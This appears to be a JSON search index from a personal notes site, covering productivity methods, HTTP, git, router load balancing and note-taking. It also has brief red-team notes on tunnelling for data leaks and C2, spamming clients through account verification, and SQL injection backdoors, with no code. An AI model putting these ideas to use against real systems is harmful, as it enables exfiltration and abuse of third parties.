way3. Review to keep everything on track. [[201910041540]] 3    [[月球共識: 2018年生產力回顧——開始接觸GTD理論，開始使用各種生產力工具]] \u0026#x21a9;\u0026#xfe0e;\n [[OmniFocus中标签使用案例分析 - 知乎]] \u0026#x21a9;\u0026#xfe0e;\n [[The Plain Text Life: Note Taking, Writing and Life Organization Using Plain Text Files - Mark Koester]] \u0026#x21a9;\u0026#xfe0e;\n   ","id":69,"section":"notes","summary":"Practical principles of GTD Actionable task. Anything that can\u0026rsquo;t be done under 2 minutes should be recorded 1 One step each time. A task is a single action and should be immutable2. This can be treated as one task in different status2 by using tags or similar ways. Focus on outcome. Describe the task as what I want to achieve in a brief and clear way3. Review to keep everything","tags":["GTD","gtd","tips","Experience","experience"],"title":"","uri":"https://kenmlai.me/notes/201910061612/","year":"2019"},{"content":"Brief key points of HTTP protocol HTTP/1.0 Each transmission/connection1 2. File transmission is slow due to TCP slow start mechanism and huge overhead of connection buildup \u0026amp; tear-down of each connection.1\nHTTP/1.1 Add keep-alive, enables multiple transmission/connection. Files are transferred serialised (second one starts after first one finishes).1 2 concurrent transferring is only possible when there are multiple TCP connections to a server. Hence, the keep-alive concept lost most of its benefit.2\nAdd pipeline, requests can be sent continuously without receiving response1 2. This feature lost most of its benefit by lacking support on the server side.2\nAdd chunked responses by not specifying Content-Length, so the client keep receiving until EOF is read.1\nHTTP/2.0 Concurrency transmission is allowed1 2, but all traffic shared with one connection suffer from packet lose, even only one of the traffic has the lose. This is because TCP doesn\u0026rsquo;t know its upper layers\u0026rsquo; abstraction, only lose in TCP layer is treated equally.2 1\nHTTP/2 is a binary protocol, which improves transmission efficiency.1\nHeader compression (HPACK) for the same or similar headers in requests.1\nserver-side push to pre-load content and store it in the client\u0026rsquo;s cache.1\nHTTP/3.0 Uses UDP as transmission protocol2. Data transmission guarantee relays on internal check mechanism instead of using TCP.\nLoad balancing by not-so-smart load balancers, routers or switches may break the communication since they use four-tuple (SIP, DIP, SPort, DPort) for hash at most. Connection ID which is used to identify communication in the protocol is ignored.1\n  [[HTTP的前世今生 | | 酷 壳 - CoolShell]] \u0026#x21a9;\u0026#xfe0e;\n [[HTTP/3: the past, the present, and the future]] \u0026#x21a9;\u0026#xfe0e;\n   ","id":70,"section":"notes","summary":"Brief key points of HTTP protocol HTTP/1.0 Each transmission/connection1 2. File transmission is slow due to TCP slow start mechanism and huge overhead of connection buildup \u0026amp; tear-down of each connection.1 HTTP/1.1 Add keep-alive, enables multiple transmission/connection. Files are transferred serialised (second one starts after first one finishes).1 2 concurrent transferring is only possible when there are multiple TCP connections to a server. Hence, the keep-alive concept lost most of","tags":["Networking","protocol","HTTP"],"title":"","uri":"https://kenmlai.me/notes/201910051049/","year":"2019"},{"content":"Git Tricks  Overwrite local files forcefully 1  git fetch --all git reset --hard origin/master git pull origin master  Migrate repository 2  git clone --mirror \u0026lt;repo\u0026gt; cd \u0026lt;repo\u0026gt; git remote set-url --push origin \u0026lt;new repo\u0026gt; git push --mirror    [[Git force pull to overwrite local files · GitHub]] \u0026#x21a9;\u0026#xfe0e;\n [[Migrate Git Repository with Branches and Commit History | DataNext Solutions]] \u0026#x21a9;\u0026#xfe0e;\n   ","id":71,"section":"notes","summary":"Git Tricks  Overwrite local files forcefully 1  git fetch --all git reset --hard origin/master git pull origin master  Migrate repository 2  git clone --mirror \u0026lt;repo\u0026gt; cd \u0026lt;repo\u0026gt; git remote set-url --push origin \u0026lt;new repo\u0026gt; git push --mirror    [[Git force pull to overwrite local files · GitHub]] \u0026#x21a9;\u0026#xfe0e;\n [[Migrate Git Repository with Branches and Commit History | DataNext Solutions]] \u0026#x21a9;\u0026#xfe0e;\n   ","tags":["git","tricks","tips"],"title":"","uri":"https://kenmlai.me/notes/201910051308/","year":"2019"},{"content":"不同类型的回顾 GTD的回顾（Review）可以按照其重要程度进行分类：\n 需要在固定时间完成，且不应该跳过的。可以设置为日历中的日程，安排固定的时间来进行处理1 为确定自己的方向与计划一致的。可以按照宏观程度来确定回顾间隔，比如每周，每月，每季度。间隔越长，相对应的时间也越宏观，而且越需要更多的时间来处理1 2。比如计划是“通过Amazon Certified Solution Architect - Professional考试”，那么分解到季度可以是哪几个季度完成多少内容的学习和复习。每个月则对应了大的知识模块。周回顾则是针对章节学习的回顾    [[Review\u0026mdash;回顾的艺术 - 知乎]] \u0026#x21a9;\u0026#xfe0e;\n [[The Plain Text Life: Note Taking, Writing and Life Organization Using Plain Text Files - Mark Koester]] \u0026#x21a9;\u0026#xfe0e;\n   ","id":72,"section":"notes","summary":"不同类型的回顾 GTD的回顾（Review）可以按照其重要程度进行分类： 需要在固定时间完成，且不应该跳过的。可以设置为日历中的日程，安排固定的","tags":["GTD","OmniFocus","Review","Calendar"],"title":"","uri":"https://kenmlai.me/notes/201910041540/","year":"2019"},{"content":"tags in Omnifocus Omnifocus可以当作是对任务划分的一个维度：\n 文件夹/项目。任务之间的逻辑从属关系 时间。时间上的关系，重点是什么时候需要显示和完成 上下文。在什么情境/条件下需要/可以做这些事。对于太过常用的工具可以不用具体写明，比如“电脑”、“手机” 标签。Omnifocus的标签增加了一个维度，可以用来表示状态/进展。比如将一个任务分解成多个状态1    [[OmniFocus中标签使用案例分析 - 知乎]] \u0026#x21a9;\u0026#xfe0e;\n   ","id":73,"section":"notes","summary":"tags in Omnifocus Omnifocus可以当作是对任务划分的一个维度： 文件夹/项目。任务之间的逻辑从属关系 时间。时间上的关系，重点是什么时候需要显示和完成","tags":["GTD","tags","OmniFocus"],"title":"","uri":"https://kenmlai.me/notes/201910041826/","year":"2019"},{"content":"Use Routers for Load Balancing Instead of using load balancer to load balancing a large volume of traffic, routers are much cheaper of doing so.\nThe traditional solution with load balancers looks like this: [[201910032017]]\nRouters can be used as load balancers by its equal-cost multi-path (ECMP) forwarding for destinations.1\n Name an IP as the service IP. this IP should not exist in the network, or this method will create a black hole. Redirect all traffic to the routers for load balancing On the routers, use policy/static routes to destinate the incoming traffic to servers behind The servers can use any IPs as long as they can communicate with the routers  On the servers, use the iptables to change destination IP for incoming packets and source IP for replies:2\nincoming\niptables -t nat -A PREROUTING -d \u0026lt;service IP\u0026gt; -j DNAT --to-destination \u0026lt;server IP:port\u0026gt;  outgoing\niptables -t nat -A POSTROUTING -d \u0026lt;service IP:port\u0026gt; -j SNAT --to-source \u0026lt;server IP\u0026gt;  There is one issue: how to hold states of connections (TCP, TLS and etc.)\nThe routers have different hash combinations to determine which path should be use for equally distribution. Here we can set it to source IP + source port + destination IP + destination port. Then each connection will always be handled by one server.\nConnection ID in the HTTP/3.0 (QUIC) is completely ignored by this method[[201910051049]], causing communication errors in the latest protocol (HTTP/3.0)\n  [[The Technical Challenges of Building Cloudflare WARP]] \u0026#x21a9;\u0026#xfe0e;\n [[NAT with Linux and iptables - Tutorial (Introduction)]] \u0026#x21a9;\u0026#xfe0e;\n   ","id":74,"section":"notes","summary":"Use Routers for Load Balancing Instead of using load balancer to load balancing a large volume of traffic, routers are much cheaper of doing so.\nThe traditional solution with load balancers looks like this: [[201910032017]]\nRouters can be used as load balancers by its equal-cost multi-path (ECMP) forwarding for destinations.1\n Name an IP as the service IP. this IP should not exist in the network, or this method will create a black hole.","tags":["Networking","LoadBalance","Routers","ECMP"],"title":"","uri":"https://kenmlai.me/notes/201910031956/","year":"2019"},{"content":"Use Load Balancers for distributing traffic  A set of servers providing same service is registered to the load balancer(s), so that the load balancer(s) know where to redirect incoming traffic Any external request for the service behind the load balancer(s) will use the \u0026ldquo;virtual\u0026rdquo; IP as the destination  There are two ways of returning traffic from servers:\n the servers return the packets to the load balancer(s), and the load balancer(s) return to the source. This method hides the IPs of servers. However, the load balancer(s) need to hold states of traffic, which make it more expensive and harder for expansion the servers return the packets to the source directly, exposing their IPs to the outside, which introduces security issues. Hence it\u0026rsquo;s rare in practice.  ","id":75,"section":"notes","summary":"Use Load Balancers for distributing traffic  A set of servers providing same service is registered to the load balancer(s), so that the load balancer(s) know where to redirect incoming traffic Any external request for the service behind the load balancer(s) will use the \u0026ldquo;virtual\u0026rdquo; IP as the destination  There are two ways of returning traffic from servers:\n the servers return the packets to the load balancer(s), and the load balancer(s) return to the source.","tags":["Networking","LoadBalance"],"title":"","uri":"https://kenmlai.me/notes/201910032017/","year":"2019"},{"content":"Good Online Services JSONPlaceholder is a service to mimic REST API calls and returns before the back-end has been developed. It supports on-line service with default data and build on-premise if there\u0026rsquo;s a custom data required.\nIt enables the separation between frond-end and back-end development, which should be considered and used more in later work.\n","id":76,"section":"notes","summary":"Good Online Services JSONPlaceholder is a service to mimic REST API calls and returns before the back-end has been developed. It supports on-line service with default data and build on-premise if there\u0026rsquo;s a custom data required.\nIt enables the separation between frond-end and back-end development, which should be considered and used more in later work.","tags":["on-line","resources"],"title":"","uri":"https://kenmlai.me/notes/201910021944/","year":"2019"},{"content":"ZettelKasten method An idea or a note is only meaningful under a certain context which may be different from its origin of the idea or the note1. How to extract ideas from their sources is critical for my later work, in which I believe understanding is what I\u0026rsquo;ve been missing for years.\nI used to take notes in margins of books and highlight parts of texts, which are barely helpful or memorable after a period. Both ways are collecting or extracting ideas from its source, making them hard to understand later since I lose the context and have to re-read them. Also, highlighting is simply another way of quoting, which skip the understanding step of taking notes unconsciously as well.\nZettelKasten method consist of the following steps in general 2 3:\n Collecting Understanding Linking/Enriching  These steps are similar to the GTD methodology4: collecting, organising and acting. Hence the ZettelKasten is also called as \u0026ldquo;The GTD of taking notes\u0026rdquo;4\nWhy writing Writing can\n help me stick with the point 5 stop jumping around in my mind and focus on how the idea develops 5 be used as-is 5 generate information which requires understanding, thoughts and interpretation.6[[201911081833]] persistent an idea and re-use it 7  It\u0026rsquo;s estimated that 1000 notes is the turning point.8\nStrength The ZettelKasten method has a balance between order and freedom 9: not too strict that can\u0026rsquo;t fit into a new idea, nor too loose that is hard to be organised. It grows by writing more as an anti-fragile system[[201911081703]], by adding more knowledge[[201911081833]] to the external brain with writings.\nAdd new notes 10 When adding a new note, a workflow can be used:\n Search for similar content Are they related? [[201910022118]] (One topic one note {2, 9 P. 2}  =\u0026gt; exactly 4. modify existence / add reference\n=\u0026gt; partially 4. create a new note, write in a clear form [[201911102156]] 5. make a note for comparison / add annotation / relationship 6. link notes {9 P. 5, 11}\n=\u0026gt; none 4. create a new note, write in a clear form [[201911102156]] 5. determine tags/keywords 6. link notes {9 P. 5, 11}\nTypes of notes  Fleeting Notes. Temporary \u0026amp; everything. Like the inbox for GTD.2 12 1 Permanent Notes. Distilled. From systematic writing or organising fleeting notes.2 12 1 Project Notes. Things related to a project only, which provide minimal help outside of the project and is mainly used as a reference.2 12  Writing, summaries (context notes 13) and idea collections can be treated as permanent notes or different notes in each categories. The categorisation depends on whether notes are purely incoming knowledge from outside or not. If they are, then these three should be put into different categories accordingly12; if they aren\u0026rsquo;t, they can be set as fleeting or permanent notes. Reference note1 can also be another type to be treated separately, which consists of the referred text and reflection on each note. Each reference note will then be linked with other notes (reference notes/permanent notes/writing/summaries).\nNo category There\u0026rsquo;s no need to determine category for each note. Instead, using tags as anchors and links to connect notes. (pp.14 of 14)\n  [[城读│怎样聪明地做笔记：德国社会学家尼克拉斯·卢曼的卡片盒]] \u0026#x21a9;\u0026#xfe0e;\n [[How to Take Smart NotesOne Simple Technique to Boost Writing, Learning and Thinking – for Students, Academics and Nonfiction Book Writers.]] \u0026#x21a9;\u0026#xfe0e;\n [[Create Zettel from Reading Notes • Zettelkasten Method]] \u0026#x21a9;\u0026#xfe0e;\n [[尽管去做——无压工作的艺术]] \u0026#x21a9;\u0026#xfe0e;\n [[Create a Zettelkasten for your Notes to Improve Thinking and Writing • Zettelkasten Method]] \u0026#x21a9;\u0026#xfe0e;\n [[Stop Relying on a Source and Have Faith in Your own Thoughts • Zettelkasten Method]] \u0026#x21a9;\u0026#xfe0e;\n [[Your Knowledge Base as a Wiki — Hack / Make]] \u0026#x21a9;\u0026#xfe0e;\n [[Baseline for Zettelkasten Software Reviews • Zettelkasten Method]] \u0026#x21a9;\u0026#xfe0e;\n [[The Zettelkasten Method]] \u0026#x21a9;\u0026#xfe0e;\n [[When Should You Start a New Note? • Zettelkasten Method]] \u0026#x21a9;\u0026#xfe0e;\n [[Why You Should Set Links Manually and Not Rely on Search Alone • Zettelkasten Method]] \u0026#x21a9;\u0026#xfe0e;\n [[The Plain Text Life: Note Taking, Writing and Life Organization Using Plain Text Files - Mark Koester]] \u0026#x21a9;\u0026#xfe0e;\n [[Zettelkasten, a method for note-taking]] \u0026#x21a9;\u0026#xfe0e;\n [[Introduction to Luhmann’s Zettelkasten- thinking and its technical implementation]] \u0026#x21a9;\u0026#xfe0e;\n   ","id":77,"section":"notes","summary":"ZettelKasten method An idea or a note is only meaningful under a certain context which may be different from its origin of the idea or the note1. How to extract ideas from their sources is critical for my later work, in which I believe understanding is what I\u0026rsquo;ve been missing for years. I used to take notes in margins of books and highlight parts of texts, which are barely helpful","tags":["writing","zettelkasten","methodology","workflow","study"],"title":"","uri":"https://kenmlai.me/notes/201910022111/","year":"2019"},{"content":"are they under a single topic? materials can be under the same topic or not based on the collecting perspective (as the topic), for example1 2:\nIf the topic is discussing GTD methodology, then the followings in the same topic:\n What is GTD comparison of GTD against other methods general principles recommendation tools etc.  but if the topic is about GTD workflow, then\n general principles recommendation tools are in one note, but introduction of GTD comparison are not  Similarly, if the focus is how to apply GTD, then we can consider\n general principles recommendation tools can be re-mixed horizontally3.    [[How to Take Smart NotesOne Simple Technique to Boost Writing, Learning and Thinking – for Students, Academics and Nonfiction Book Writers.]] \u0026#x21a9;\u0026#xfe0e;\n [[When Should You Start a New Note? • Zettelkasten Method]] \u0026#x21a9;\u0026#xfe0e;\n which tool is best for which step, different practices of each step with different tools, etc. \u0026#x21a9;\u0026#xfe0e;\n   ","id":78,"section":"notes","summary":"are they under a single topic? materials can be under the same topic or not based on the collecting perspective (as the topic), for example1 2:\nIf the topic is discussing GTD methodology, then the followings in the same topic:\n What is GTD comparison of GTD against other methods general principles recommendation tools etc.  but if the topic is about GTD workflow, then\n general principles recommendation tools are in one note, but introduction of GTD comparison are not  Similarly, if the focus is how to apply GTD, then we can consider","tags":["zettelkasten","methodology","workflow"],"title":"","uri":"https://kenmlai.me/notes/201910022118/","year":"2019"},{"content":"Red Team Cases  Tunneling can be a series of data leaking \u0026amp; C2 attacks \u0026hellip;\u0026hellip; [[201909261144]] Spam a client through account verification \u0026hellip;\u0026hellip; [[201910191200]], instead of using SMS, email verification can be used in the lab SQL Injection with backdoor injection \u0026hellip;\u0026hellip; [[201910201702]][[201910201719]]  ","id":79,"section":"notes","summary":"Red Team Cases  Tunneling can be a series of data leaking \u0026amp; C2 attacks \u0026hellip;\u0026hellip; [[201909261144]] Spam a client through account verification \u0026hellip;\u0026hellip; [[201910191200]], instead of using SMS, email verification can be used in the lab SQL Injection with backdoor injection \u0026hellip;\u0026hellip; [[201910201702]][[201910201719]]  ","tags":["cybersecurity","Security","RedTeam","DoS","Development","DataLeaking","Tunneling"],"title":"","uri":"https://kenmlai.me/notes/201909292035/","year":"2019"},{"content":"SSL VPN Pros \u0026amp; Cons SSL VPN pros:\n More adaptable to almost all environment. Only a HTTP service needs to be exposed to the INTERNET. only a browser is needed; other services in an intra-net will be proxied by the browser service P6 of 1  cons:\n 3 major SSL VPN vendors dominate 75% market share, so any exploit is highly repeatable. easily be forgotten after deployment  P9, P15 of 1\n  [[Infiltrating Corporate Intranet Like NSA - Pre-auth RCE on Leading SSL VPNs]] \u0026#x21a9;\u0026#xfe0e;\n   ","id":80,"section":"notes","summary":"SSL VPN Pros \u0026amp; Cons SSL VPN pros:\n More adaptable to almost all environment. Only a HTTP service needs to be exposed to the INTERNET. only a browser is needed; other services in an intra-net will be proxied by the browser service P6 of 1  cons:\n 3 major SSL VPN vendors dominate 75% market share, so any exploit is highly repeatable. easily be forgotten after deployment  P9, P15 of 1","tags":["cybersecurity","RedTeam","Infritriting","VPN"],"title":"","uri":"https://kenmlai.me/notes/201909282151/","year":"2019"},{"content":"In-line Evaluation In-line evaluation is dangerous, which creates more chances of vulnerability. Code review, test framework, security checks should be introduced to mitigate the issue1 2\n  Command Injection in F5 iRules \u0026#x21a9;\u0026#xfe0e;\n [[iRule injection]] \u0026#x21a9;\u0026#xfe0e;\n   ","id":81,"section":"notes","summary":"In-line Evaluation In-line evaluation is dangerous, which creates more chances of vulnerability. Code review, test framework, security checks should be introduced to mitigate the issue1 2\n  Command Injection in F5 iRules \u0026#x21a9;\u0026#xfe0e;\n [[iRule injection]] \u0026#x21a9;\u0026#xfe0e;\n   ","tags":["cybersecurity","redteam","codeinjection","tcl"],"title":"","uri":"https://kenmlai.me/notes/201909271126/","year":"2019"},{"content":"Tunneling any protocol can be used as a underlaid transportation protocol, like ICMP, DNS, SMB, HTTP. It\u0026rsquo;s effective since lots of perimeter defense either ignore them or isn\u0026rsquo;t capable of analyze them1\n  [[Flying A False Flag: Advanced C2, Trust Conflicts, and Domain Takeover]] \u0026#x21a9;\u0026#xfe0e;\n   ","id":82,"section":"notes","summary":"Tunneling any protocol can be used as a underlaid transportation protocol, like ICMP, DNS, SMB, HTTP. It\u0026rsquo;s effective since lots of perimeter defense either ignore them or isn\u0026rsquo;t capable of analyze them1\n  [[Flying A False Flag: Advanced C2, Trust Conflicts, and Domain Takeover]] \u0026#x21a9;\u0026#xfe0e;\n   ","tags":["c2","cybersecurity","redteam"],"title":"","uri":"https://kenmlai.me/notes/201909261144/","year":"2019"},{"content":"The performance of Rest API framework The Falcon has way better performance than Flask.1\n  [[Falcon: A Python Framework for Writing Excellent Microservices and APIs]] \u0026#x21a9;\u0026#xfe0e;\n   ","id":83,"section":"notes","summary":"The performance of Rest API framework The Falcon has way better performance than Flask.1\n  [[Falcon: A Python Framework for Writing Excellent Microservices and APIs]] \u0026#x21a9;\u0026#xfe0e;\n   ","tags":["python","falcon","flask","framework","performance","restapi"],"title":"","uri":"https://kenmlai.me/notes/201909241346/","year":"2019"}],"tags":[{"title":"Actions","uri":"https://kenmlai.me/tags/actions/"},{"title":"Ansible","uri":"https://kenmlai.me/tags/ansible/"},{"title":"applescript","uri":"https://kenmlai.me/tags/applescript/"},{"title":"Architecture","uri":"https://kenmlai.me/tags/architecture/"},{"title":"array","uri":"https://kenmlai.me/tags/array/"},{"title":"Australia","uri":"https://kenmlai.me/tags/australia/"},{"title":"auto","uri":"https://kenmlai.me/tags/auto/"},{"title":"Automation","uri":"https://kenmlai.me/tags/automation/"},{"title":"autosummary","uri":"https://kenmlai.me/tags/autosummary/"},{"title":"awk","uri":"https://kenmlai.me/tags/awk/"},{"title":"AWS","uri":"https://kenmlai.me/tags/aws/"},{"title":"AWSIdentity","uri":"https://kenmlai.me/tags/awsidentity/"},{"title":"BGP","uri":"https://kenmlai.me/tags/bgp/"},{"title":"business","uri":"https://kenmlai.me/tags/business/"},{"title":"c2","uri":"https://kenmlai.me/tags/c2/"},{"title":"Calendar","uri":"https://kenmlai.me/tags/calendar/"},{"title":"career","uri":"https://kenmlai.me/tags/career/"},{"title":"Checklist","uri":"https://kenmlai.me/tags/checklist/"},{"title":"cicd","uri":"https://kenmlai.me/tags/cicd/"},{"title":"CLI","uri":"https://kenmlai.me/tags/cli/"},{"title":"CloudTrail","uri":"https://kenmlai.me/tags/cloudtrail/"},{"title":"CloudWatch","uri":"https://kenmlai.me/tags/cloudwatch/"},{"title":"codeinjection","uri":"https://kenmlai.me/tags/codeinjection/"},{"title":"confirmation bias","uri":"https://kenmlai.me/tags/confirmation-bias/"},{"title":"container","uri":"https://kenmlai.me/tags/container/"},{"title":"css","uri":"https://kenmlai.me/tags/css/"},{"title":"Cyber","uri":"https://kenmlai.me/tags/cyber/"},{"title":"cybersecurity","uri":"https://kenmlai.me/tags/cybersecurity/"},{"title":"DataLeaking","uri":"https://kenmlai.me/tags/dataleaking/"},{"title":"Design","uri":"https://kenmlai.me/tags/design/"},{"title":"Development","uri":"https://kenmlai.me/tags/development/"},{"title":"devonthink","uri":"https://kenmlai.me/tags/devonthink/"},{"title":"DevOps","uri":"https://kenmlai.me/tags/devops/"},{"title":"DHCP","uri":"https://kenmlai.me/tags/dhcp/"},{"title":"diet","uri":"https://kenmlai.me/tags/diet/"},{"title":"docker","uri":"https://kenmlai.me/tags/docker/"},{"title":"DoS","uri":"https://kenmlai.me/tags/dos/"},{"title":"ECMP","uri":"https://kenmlai.me/tags/ecmp/"},{"title":"effective","uri":"https://kenmlai.me/tags/effective/"},{"title":"effectiveness","uri":"https://kenmlai.me/tags/effectiveness/"},{"title":"efficacy","uri":"https://kenmlai.me/tags/efficacy/"},{"title":"efficiency","uri":"https://kenmlai.me/tags/efficiency/"},{"title":"emoji","uri":"https://kenmlai.me/tags/emoji/"},{"title":"Exam","uri":"https://kenmlai.me/tags/exam/"},{"title":"experience","uri":"https://kenmlai.me/tags/experience/"},{"title":"falcon","uri":"https://kenmlai.me/tags/falcon/"},{"title":"FFMPEG","uri":"https://kenmlai.me/tags/ffmpeg/"},{"title":"Firehose","uri":"https://kenmlai.me/tags/firehose/"},{"title":"flask","uri":"https://kenmlai.me/tags/flask/"},{"title":"Fortitude Valley","uri":"https://kenmlai.me/tags/fortitude-valley/"},{"title":"Fragile","uri":"https://kenmlai.me/tags/fragile/"},{"title":"framework","uri":"https://kenmlai.me/tags/framework/"},{"title":"git","uri":"https://kenmlai.me/tags/git/"},{"title":"gitea","uri":"https://kenmlai.me/tags/gitea/"},{"title":"growth","uri":"https://kenmlai.me/tags/growth/"},{"title":"GTD","uri":"https://kenmlai.me/tags/gtd/"},{"title":"gunicorn","uri":"https://kenmlai.me/tags/gunicorn/"},{"title":"Health","uri":"https://kenmlai.me/tags/health/"},{"title":"HighAvailability","uri":"https://kenmlai.me/tags/highavailability/"},{"title":"homebuild","uri":"https://kenmlai.me/tags/homebuild/"},{"title":"hsrp","uri":"https://kenmlai.me/tags/hsrp/"},{"title":"html","uri":"https://kenmlai.me/tags/html/"},{"title":"HTTP","uri":"https://kenmlai.me/tags/http/"},{"title":"https","uri":"https://kenmlai.me/tags/https/"},{"title":"Hurstville","uri":"https://kenmlai.me/tags/hurstville/"},{"title":"IAM","uri":"https://kenmlai.me/tags/iam/"},{"title":"idea","uri":"https://kenmlai.me/tags/idea/"},{"title":"Infritriting","uri":"https://kenmlai.me/tags/infritriting/"},{"title":"Kinesis","uri":"https://kenmlai.me/tags/kinesis/"},{"title":"kubernetes","uri":"https://kenmlai.me/tags/kubernetes/"},{"title":"Lambda","uri":"https://kenmlai.me/tags/lambda/"},{"title":"Linux","uri":"https://kenmlai.me/tags/linux/"},{"title":"list","uri":"https://kenmlai.me/tags/list/"},{"title":"LoadBalance","uri":"https://kenmlai.me/tags/loadbalance/"},{"title":"mac","uri":"https://kenmlai.me/tags/mac/"},{"title":"macos","uri":"https://kenmlai.me/tags/macos/"},{"title":"management","uri":"https://kenmlai.me/tags/management/"},{"title":"markdown","uri":"https://kenmlai.me/tags/markdown/"},{"title":"Marking","uri":"https://kenmlai.me/tags/marking/"},{"title":"Meek","uri":"https://kenmlai.me/tags/meek/"},{"title":"meeting","uri":"https://kenmlai.me/tags/meeting/"},{"title":"methodology","uri":"https://kenmlai.me/tags/methodology/"},{"title":"microservices","uri":"https://kenmlai.me/tags/microservices/"},{"title":"nc","uri":"https://kenmlai.me/tags/nc/"},{"title":"netcat","uri":"https://kenmlai.me/tags/netcat/"},{"title":"Network","uri":"https://kenmlai.me/tags/network/"},{"title":"Networking","uri":"https://kenmlai.me/tags/networking/"},{"title":"Nornir","uri":"https://kenmlai.me/tags/nornir/"},{"title":"Note","uri":"https://kenmlai.me/tags/note/"},{"title":"NSW","uri":"https://kenmlai.me/tags/nsw/"},{"title":"OmniFocus","uri":"https://kenmlai.me/tags/omnifocus/"},{"title":"on-line","uri":"https://kenmlai.me/tags/on-line/"},{"title":"OSPF","uri":"https://kenmlai.me/tags/ospf/"},{"title":"Parallel","uri":"https://kenmlai.me/tags/parallel/"},{"title":"Parameter Store","uri":"https://kenmlai.me/tags/parameter-store/"},{"title":"PatchManager","uri":"https://kenmlai.me/tags/patchmanager/"},{"title":"performance","uri":"https://kenmlai.me/tags/performance/"},{"title":"Phones","uri":"https://kenmlai.me/tags/phones/"},{"title":"Photos","uri":"https://kenmlai.me/tags/photos/"},{"title":"poetry","uri":"https://kenmlai.me/tags/poetry/"},{"title":"port","uri":"https://kenmlai.me/tags/port/"},{"title":"privacy","uri":"https://kenmlai.me/tags/privacy/"},{"title":"product","uri":"https://kenmlai.me/tags/product/"},{"title":"production","uri":"https://kenmlai.me/tags/production/"},{"title":"productivity","uri":"https://kenmlai.me/tags/productivity/"},{"title":"programming","uri":"https://kenmlai.me/tags/programming/"},{"title":"Project","uri":"https://kenmlai.me/tags/project/"},{"title":"protocol","uri":"https://kenmlai.me/tags/protocol/"},{"title":"psychology","uri":"https://kenmlai.me/tags/psychology/"},{"title":"python","uri":"https://kenmlai.me/tags/python/"},{"title":"QLD","uri":"https://kenmlai.me/tags/qld/"},{"title":"raspberrypi","uri":"https://kenmlai.me/tags/raspberrypi/"},{"title":"Reading","uri":"https://kenmlai.me/tags/reading/"},{"title":"recipe","uri":"https://kenmlai.me/tags/recipe/"},{"title":"Redirection","uri":"https://kenmlai.me/tags/redirection/"},{"title":"redteam","uri":"https://kenmlai.me/tags/redteam/"},{"title":"Redundancy","uri":"https://kenmlai.me/tags/redundancy/"},{"title":"reflection","uri":"https://kenmlai.me/tags/reflection/"},{"title":"resources","uri":"https://kenmlai.me/tags/resources/"},{"title":"restapi","uri":"https://kenmlai.me/tags/restapi/"},{"title":"Review","uri":"https://kenmlai.me/tags/review/"},{"title":"Robust","uri":"https://kenmlai.me/tags/robust/"},{"title":"Routers","uri":"https://kenmlai.me/tags/routers/"},{"title":"RTSP","uri":"https://kenmlai.me/tags/rtsp/"},{"title":"Security","uri":"https://kenmlai.me/tags/security/"},{"title":"self-learning","uri":"https://kenmlai.me/tags/self-learning/"},{"title":"shopping","uri":"https://kenmlai.me/tags/shopping/"},{"title":"shortcodes","uri":"https://kenmlai.me/tags/shortcodes/"},{"title":"sideproject","uri":"https://kenmlai.me/tags/sideproject/"},{"title":"spam","uri":"https://kenmlai.me/tags/spam/"},{"title":"spanning tree","uri":"https://kenmlai.me/tags/spanning-tree/"},{"title":"SQLInjection","uri":"https://kenmlai.me/tags/sqlinjection/"},{"title":"ssl","uri":"https://kenmlai.me/tags/ssl/"},{"title":"start","uri":"https://kenmlai.me/tags/start/"},{"title":"Startup","uri":"https://kenmlai.me/tags/startup/"},{"title":"string","uri":"https://kenmlai.me/tags/string/"},{"title":"study","uri":"https://kenmlai.me/tags/study/"},{"title":"success","uri":"https://kenmlai.me/tags/success/"},{"title":"Systematic","uri":"https://kenmlai.me/tags/systematic/"},{"title":"SystemsManager","uri":"https://kenmlai.me/tags/systemsmanager/"},{"title":"tags","uri":"https://kenmlai.me/tags/tags/"},{"title":"tcl","uri":"https://kenmlai.me/tags/tcl/"},{"title":"text","uri":"https://kenmlai.me/tags/text/"},{"title":"themes","uri":"https://kenmlai.me/tags/themes/"},{"title":"Thinkings","uri":"https://kenmlai.me/tags/thinkings/"},{"title":"Threats","uri":"https://kenmlai.me/tags/threats/"},{"title":"tips","uri":"https://kenmlai.me/tags/tips/"},{"title":"Tor","uri":"https://kenmlai.me/tags/tor/"},{"title":"Training","uri":"https://kenmlai.me/tags/training/"},{"title":"tricks","uri":"https://kenmlai.me/tags/tricks/"},{"title":"Tunneling","uri":"https://kenmlai.me/tags/tunneling/"},{"title":"Ubuntu","uri":"https://kenmlai.me/tags/ubuntu/"},{"title":"VirtualBox","uri":"https://kenmlai.me/tags/virtualbox/"},{"title":"Virtualization","uri":"https://kenmlai.me/tags/virtualization/"},{"title":"VMWare","uri":"https://kenmlai.me/tags/vmware/"},{"title":"VPN","uri":"https://kenmlai.me/tags/vpn/"},{"title":"Web","uri":"https://kenmlai.me/tags/web/"},{"title":"weightloss","uri":"https://kenmlai.me/tags/weightloss/"},{"title":"work","uri":"https://kenmlai.me/tags/work/"},{"title":"workflow","uri":"https://kenmlai.me/tags/workflow/"},{"title":"writing","uri":"https://kenmlai.me/tags/writing/"},{"title":"zettelkasten","uri":"https://kenmlai.me/tags/zettelkasten/"}]}